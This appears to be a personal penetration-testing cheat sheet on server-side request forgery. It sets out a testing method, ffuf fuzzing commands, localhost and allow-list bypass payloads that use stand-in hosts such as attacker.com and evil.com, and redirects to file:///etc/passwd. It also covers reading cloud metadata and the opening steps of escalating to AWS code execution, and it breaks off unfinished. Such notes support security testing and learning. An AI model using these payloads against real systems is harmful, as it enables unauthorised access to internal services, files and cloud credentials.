# Server Site Request Forgery (SSRF)

The flow chart of SSRF goes here:

## Methodology

- Discover functionalities that forces the server to send HTTP requests
- Hidden parameters discovery, then work manually
- Check file uploads for SSRF by SVG (change image content type to `image/svg+xml`)
- PDF generators, HTML and message boxes which turns into something else
- Fuzz every parameter for SSRF (use collaborator Everywhere or auto-repeater)
- URL like parameters, work manually
- pdf generators, the pdf file should be downloaded and be tested with exiftool to find the generator and find exploit for it

## Bypasses, Tricks

Try following methods

- Try to fuzz `subdomains` and `IPs`

```bash
ffuf -w subdomains -u https://sub.domian.tld/page.ext?**SSRFPARAM**=https://**FUZZ**.domain.tld
# put subdomains in the list and check for bypasses (cut -d '.' -f1 -> subdomains.txt)
ffuf -w IPs -u https://sub.domian.tld/page.ext?**SSRFPARAM**=https://**FUZZ**
```

- Fuzz to find something

```bash
fuff -w wc.txt -u https://domain.tld/page.ext?**SSRFPARAM**=https://**FUZZ**.domain.tld
```

- Try to open forbidden URL (403)
- Discover an open redirect, try to chain it with SSRF
- Try a domain pointing to internal IP
- Try these bypasses

```markdown
SSRF bypasses (for protocol):

1.different shemes can be used:
* file:///   --> allow an attacker to fetch the content of a file on the server
== if server suports file we can read file!
# dict://    --> used to refer to world lists available using the dict protocol
* sftp://    --> used for secure file transfer over secure shell
* ldap://    --> Lightweight Directory Access Protocol
* tftp://    --> Trivial Fiel Transfer Protocol, works over udp
# gopher://  --> designed for distributing, searching, and retrieving doc
* http(s):// --> used to fetch any contenf from the web

SSRF bypasses (for url check):
1. it checkts if attacker is not entered internal IP --> (Vulnerable)
==> must not check just IP

* : 127.1 or 0x7F00001--> 127.0.0.1 (use alternatives internal IPs)
* : local.ali.com --> 127.0.0.1 (make a subdomain that points to internal IPs) 
* : [::1] or [::] --> ip version6

2. it checks white list:
* https://company.com --> https://company.com@127.0.0.1

3. it checks if URL starts with http protocol 
* : https://attacker.com --> file:///file/passwd 
==> attacker make an ulr that redirects to another protocol (file)
* : https://attacker.com --> http://127.0.0.1

4. it securly checks domain but one of subdomain has open redirects
* : https://company.com/next?url=https://attacker.com

5. https://user@evil.com@company.com

========================================================================

## Exploitaion: 
 1. reading enternal files (if "file" scheme is allowed)
 ==> sometimes scheme file is not nessecery just /etc/passwd
 2. disclosing origin ip behind CDN
 3. reading cloud meta data 
 ==> every porvider is different(find cloud default ip[169.154.169.154]) 
 4. scanning enternal IPs and Ports

gopherus and ssrfmap are tools:
gopherus
```

```bash
dig a +short ali.fbi.com  #127.0.0.1
```

- Try other IP representative

```
0x7f000001                   #127.0.0.1
127.1                        #127.0.0.1
0.0.0.0                      #127.0.0.1
2130706433                   #127.0.0.1
0                            #127.0.0.1
localtest.me                 #127.0.0.1
my.computer                  #127.0.0.1
ip6-localhost                #127.0.0.1
[0:0:0:0:ffff:127.0.0.1]     #127.0.0.1
 
#java only
url:http://127.0.0.1
url:file:///etc/passwd
```

- Try redirect bypass method to take advantage of various schemes (gopher, dict, file …)
    - URL → check [http(s)] → OK → HTTP Req → Redirects to (gopher:// or file:///)
- Try DNS Rebinding (use [this](https://lock.cmpxchg8b.com/rebinder.html))
    - Domain → Resolution (Google) → ok → HTTP Req → 127.0.0.1

## SVG file

```
**svg-cheatsheet** --> from github (use updatedly) bcz it changes time to time
```

## Post Exploitation

- Check if any useful port is open or not (MYSQL, Redis or etc.)
- Check if any useful scheme is available (Gopher, dict or etc.)
- Check if website is hosted on any cloud service or not (Amazon, Google or etc.)
- You can use Gopherus to exploit …

### Redis - Escalating to RCE

Read write ups

## AWS - Escalating tp RCE

Steps:

1. Gathering the region
2. Gathering the required information
3. Configuring the `awscli`
4. Connecting to API
5. Get accessible instances
6. Executing the command
7. Fetching the results

Determine the region:

```
http://169.254.169.254/latest/dynamic/instance-identity/document
```

… 

…

..